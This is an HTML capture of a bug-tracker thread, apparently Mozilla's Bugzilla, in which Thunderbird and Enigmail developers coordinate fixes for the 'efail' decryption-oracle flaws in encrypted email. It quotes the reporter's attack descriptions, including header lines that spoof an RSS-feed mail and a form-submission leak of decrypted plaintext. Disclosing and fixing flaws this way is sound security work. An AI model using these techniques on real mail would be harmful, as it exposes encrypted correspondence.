  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a></div></div></div><div class="change-set" id="a200020_101158"><div class="change" id="aa200020_101158">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a200020_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_101158" id="a200020_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a200020_101158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a200020_101158">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a200020_101158">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-23 14:08 PST" data-time="1511474911">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1420217">1420217</a></div></div></div><div class="change-set" id="c5"><div class="comment" data-id="12929054" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a200020_101158"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a200020_101158"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-12-20 07:35 PST" data-time="1513784129">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-5" data-comment-id="12929054">CCing some additional Thunderbird folks, hoping this will get their attention.</pre></div><div class="change-set" id="c6"><div class="comment" data-id="12976148" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a200020_101158"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a200020_101158"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-17 05:44 PST" data-time="1516196694">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-6" data-comment-id="12976148">Jörg, can you take this? Let me know if we can be of any help.</pre><div class="activity"><div class="change">Assignee: nobody &rarr; jorgk</div><div class="change">Flags: needinfo?(jorgk)</div></div></div><div class="change-set" id="c7"><div class="comment" data-id="12976557" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a200020_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a200020_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-17 08:03 PST" data-time="1516204985">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-7" data-comment-id="12976557">See <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Susceptibility to S/MIME Message Takeover Attacks"
   href="/show_bug.cgi?id=1240290#c54">bug 1240290 comment #54</a>.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(jorgk)</span></div></div></div><div class="change-set" id="c8"><div class="comment" data-id="12979016" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_253233" id="a200020_101158"><img src="https://secure.gravatar.com/avatar/834e6840be1a79998020e3004c902ac7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_253233" id="a200020_101158"><a class="email " href="/user_profile?user_id=253233" > <span class="fna">Philipp Kewisch [:Fallen] [:📆][:🧩]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-18 05:23 PST" data-time="1516281821">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-8" data-comment-id="12979016">Joshua promised to take a look at this after work. Thanks Joshua &lt;3</pre><div class="activity"><div class="change">Assignee: jorgk &rarr; Pidgeot18</div><div class="change">Flags: needinfo?(Pidgeot18)</div></div></div><div class="change-set" id="c9"><div class="comment" data-id="12993382" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_286107" id="a200020_101158"><img src="https://secure.gravatar.com/avatar/454e57b6803023bd2c8c92abaff23861?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_286107" id="a200020_101158"><a class="email " href="/user_profile?user_id=286107" > <span class="fna">Joshua Cranmer [:jcranmer]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-24 17:28 PST" data-time="1516843685">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-9" data-comment-id="12993382">Some comments:
(In reply to Jens Müller from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c0">comment #0</a>)
<span class="quote">&gt; ****************************************
&gt; *** Issue A: Leaking encrypted mails ***
&gt; ****************************************</span >

The effective cause of the problem is that libmime produces a single HTML page by concatenating all of the parts together. This means that the HTML sections can already bleed together (and there are definitely bugs on this that I'm not going to try to find right now). The easy way to fix this would be to put every every document in a separate &lt;iframe&gt;, but we would need <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Need a way to specify an auto-height (size) for an IFRAME such that the frame is given the full height of the contained content (moz-seamless, part of seamless iframes)"
   href="/show_bug.cgi?id=80713">bug 80713</a> to avoid the fixed height issue, and that bug's been on nobody's radar for years. Maybe the fact that there's a security bug in not doing so could light a fire, but I wouldn't hold out high hopes.

<span class="quote">&gt; ----------------------------------------------------------
&gt; *Proof of concept 2: Leaking plaintext through HTML forms*
&gt; ----------------------------------------------------------</span >

We actually support submitting forms? o_O

My memory isn't entirely wrong: judging from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - Form submission from HTML mail is completely broken (action = get)"
   href="/show_bug.cgi?id=533545#c76">bug 533545 comment 76</a>, supporting form submission in HTML email is not an intended feature. It was broken at some point, but apparently we never fully ripped out the breakage.

<span class="quote">&gt; - In the current version (52.4.0), Thunderbird can be tricked into thinking
&gt; a mail is an RSS feed if the mail begins with certain headers:
&gt;   From - Fri Nov 17 20:13:09 2017
&gt;   X-Mozilla-Status2: 00000040
&gt; Note that this seems to work only for local (Movemail) message setups, not
&gt; if the mail is fetched via IMAP or POP3</span >

In practice, someone who can inject mail into Movemail is already doing arbitrary file I/O on your machine, which means you've already basically lost the security game.

We do have checks to ignore X-Mozilla-* headers if it comes from elsewhere, but I think we reused the mbox code to handle movemail.

<span class="quote">&gt; Note that this attack does not seem to work for S/MIME because Thunderbird's
&gt; S/MIME implementation only shows a valid signature if the whole message
&gt; (including all parts) is correctly signed.</span >

Yes, S/MIME does have a check such that if the encrypted piece isn't the top-level of the message, it ignores the security status information. This is actually baked in the frontend; the backend library blindly passes everything along with a nesting depth, but the frontend drops everything that's not top-level. It sounds like Enigmail isn't doing the same logic, or just setting the nesting depth unconditionally to 1, which needs to be brought up with the Enigmail folks.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(Pidgeot18)</span></div></div></div><div class="change-set" id="c10"><div class="comment" data-id="13025292" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a200020_101158"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a200020_101158"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-07 10:32 PST" data-time="1518028371">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-10" data-comment-id="13025292">Update from our side: We would like to go full-disclosure in mid April in the scope of an academic paper (covering a whole bunch of email security issues). We think it's a very serious issue: with a single tiny bit of user interaction (or maybe without if the attacker somehow manages to bypass remote content blocking) -- the encrypted mails of years can be leaked.

One workaround would be to not render HTML content in encrypted mails (Enigmail does this already for PGP/INLINE) or consequently block remote content (not give the user an option!), forms etc. for encrypted content and not to allow users to click on links etc. In respect to <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED"
   href="/show_bug.cgi?id=1411592">bug 1411592</a>, this seems to be necessary anyway.</pre></div><div class="change-set" id="a7961455_176914"><div class="change" id="aa7961455_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a7961455_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a7961455_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a7961455_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a7961455_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a7961455_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-21 10:05 PST" data-time="1519236346">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8930484&amp;action=edit"
           title="Decryption oracle PoC 1: Leaking plaintext through reply/forward"
           class=""
        >Attachment #8930484</a> -
        Attachment mime type: message/rfc822 &rarr; text/plain</div></div></div><div class="change-set" id="c11"><div class="comment" data-id="13058595" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a7961455_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a7961455_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-21 10:16 PST" data-time="1519236972">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-11" data-comment-id="13058595">(In reply to Joshua Cranmer [:jcranmer] from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c9">comment #9</a>)
<span class="quote">&gt; The easy way to fix this would
&gt; be to put every document in a separate &lt;iframe&gt;,</span >
This was last attempted in <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - html attachment with CSS breaks email rendering"
   href="/show_bug.cgi?id=1297653">bug 1297653</a> (now a duplicate of ancient <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Display attachments inline: Contents &amp; formatting of attached HTML file (background/CSS styles/position:absolute/dir=&quot;rtl&quot;...) leak into main HTML part or vice versa (wrong bgcolor/images/unclosed tags...: unreadable; multipart/mime, iframe,send web page)"
   href="/show_bug.cgi?id=31052">bug 31052</a>) to avoid bleeding of CSS ...

<span class="quote">&gt; but we would need <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Need a way to specify an auto-height (size) for an IFRAME such that the frame is given the full height of the contained content (moz-seamless, part of seamless iframes)"
   href="/show_bug.cgi?id=80713">bug 80713</a> to avoid the fixed height issue, ...</span >
... without even knowing about that issue.</pre></div><div class="change-set" id="c12"><div class="comment" data-id="13154346" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_253233" id="a7961455_176914"><img src="https://secure.gravatar.com/avatar/834e6840be1a79998020e3004c902ac7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_253233" id="a7961455_176914"><a class="email " href="/user_profile?user_id=253233" > <span class="fna">Philipp Kewisch [:Fallen] [:📆][:🧩]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-25 14:20 PDT" data-time="1522012848">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-12" data-comment-id="13154346">(In reply to Joshua Cranmer [:jcranmer] from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c9">comment #9</a>)
<span class="quote">&gt; Yes, S/MIME does have a check such that if the encrypted piece isn't the
&gt; top-level of the message, it ignores the security status information. This
&gt; is actually baked in the frontend; the backend library blindly passes
&gt; everything along with a nesting depth, but the frontend drops everything
&gt; that's not top-level. It sounds like Enigmail isn't doing the same logic, or
&gt; just setting the nesting depth unconditionally to 1, which needs to be
&gt; brought up with the Enigmail folks.</span >

Patrick, is this maybe already fixed in Enigmail 2.0? Anything you could do to secure things on your side?</pre><div class="activity"><div class="change">Flags: needinfo?(patrick)</div></div></div><div class="change-set" id="c13"><div class="comment" data-id="13154727" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a7961455_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a7961455_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-25 23:33 PDT" data-time="1522046025">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-13" data-comment-id="13154727">I fixed these issues in Enigmail 1.9.9 already (without announcing it).

The only exception is Encryption PoC 2 -- I cannot see how I could fix this in Enigmail.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(patrick)</span></div></div></div><div class="change-set" id="c14"><div class="comment" data-id="13154812" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_253233" id="a7961455_176914"><img src="https://secure.gravatar.com/avatar/834e6840be1a79998020e3004c902ac7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_253233" id="a7961455_176914"><a class="email " href="/user_profile?user_id=253233" > <span class="fna">Philipp Kewisch [:Fallen] [:📆][:🧩]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-26 00:35 PDT" data-time="1522049752">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-14" data-comment-id="13154812">Nice, that sounds great! So this means all we'd need to do to fix the bug is to disable form submissions? That seems simple enough. Magnus, do you have cycles to look at this in the next week?</pre><div class="activity"><div class="change">Flags: needinfo?(mkmelin+mozilla)</div></div></div><div class="change-set" id="a11166728_101158"><div class="change" id="aa11166728_101158">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_101158" id="a11166728_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a11166728_101158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a11166728_101158">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a11166728_101158">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-30 13:26 PDT" data-time="1522441619">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">CVE-2018-5185</a></div></div></div><div class="change-set" id="c15"><div class="comment" data-id="13169800" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a11166728_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-30 13:34 PDT" data-time="1522442091">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-15" data-comment-id="13169800">Looked at the form submission issue, fixing it in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">bug 1450345</a>.

I did not verify, but I don't think the other issues regarding decryption reported in this bug are fixed.

Patrick, did you only mean the &quot;Issue B: Signature Spoofing Attacks&quot; are fixed. Or how is the &quot;Issue A: Leaking encrypted mails&quot; problem resolved?</pre><div class="activity"><div class="change">Flags: needinfo?(mkmelin+mozilla) &rarr; needinfo?(patrick)</div></div></div><div class="change-set" id="c16"><div class="comment" data-id="13170420" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a11166728_101158"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-31 02:41 PDT" data-time="1522489306">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-16" data-comment-id="13170420">Issue B is fixed in Enigmail, that's a pure UI thing.

Issue A is fixed as far as I can:
- PoC 1 is &quot;fixed&quot; in Enigmail by displaying a warning to the user if a &quot;suspicious&quot; type of PGP/MIME (or inline-PGP) structure is detected.
- PoC 2 and PoC 3: AFAICT this cannot be addressed by Enigmail</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(patrick)</span></div></div></div><div class="change-set" id="c17"><div class="comment" data-id="13179187" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a11166728_101158"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-04 04:53 PDT" data-time="1522842819">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-17" data-comment-id="13179187">To recapitulate:

+--------------------------------------------------------------------------------+
|                | S/MIME                         | OpenPGP                      |
|----------------+--------------------------------+------------------------------|
| Issue A, PoC 1 | fixed? (dec only if top-level) | mitigated in Enigmail 1.9.9  |
| Issue A, PoC 2 | fixed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">Bug 1450345</a> (TB 60)   | fixed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">Bug 1450345</a> (TB 60) |
